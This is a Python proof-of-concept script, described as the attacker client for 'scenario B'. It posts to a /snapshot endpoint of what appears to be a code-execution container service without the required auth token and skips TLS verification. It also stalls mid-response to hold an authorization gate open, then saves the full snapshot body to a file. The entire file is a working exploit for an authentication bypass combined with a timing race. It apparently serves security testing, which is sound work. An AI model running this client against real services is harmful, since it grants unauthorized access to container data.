"""Attacker client for scenario B: POST /snapshot with NO container auth token,
read the first `head` bytes, stall `stall` seconds (holding the request open so
the gate stays 'active'), then read the rest. Writes the body to `out`.

usage: python -I attacker_slow.py <host> <port> <out> <head_bytes> <stall_seconds>
"""
import http.client
import socket
import ssl
import sys
import time

host, port, out, head, stall = sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]), float(sys.argv[5])


class SmallBufConn(http.client.HTTPSConnection):
    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 64 * 1024)
        s.connect((self.host, self.port))
        self.sock = self._context.wrap_socket(s, server_hostname=self.host)


ctx = ssl._create_unverified_context()  # the attacker does not care who the server is
ctx.set_alpn_protocols(["http/1.1"])
t0 = time.time()
c = SmallBufConn(host, port, context=ctx)
c.request("POST", "/snapshot", body=None, headers={"Content-Length": "0"})
r = c.getresponse()
print(f"[attacker] t={time.time()-t0:5.2f}s HTTP {r.status} (no X-Code-Execution-Container-Auth-Token sent)", flush=True)
first = r.read(head)
print(f"[attacker] t={time.time()-t0:5.2f}s read first {len(first)} bytes, now stalling {stall}s with the request still open", flush=True)
time.sleep(stall)
rest = r.read()
with open(out, "wb") as f:
    f.write(first + rest)
print(f"[attacker] t={time.time()-t0:5.2f}s done, {len(first)+len(rest)} bytes total", flush=True)
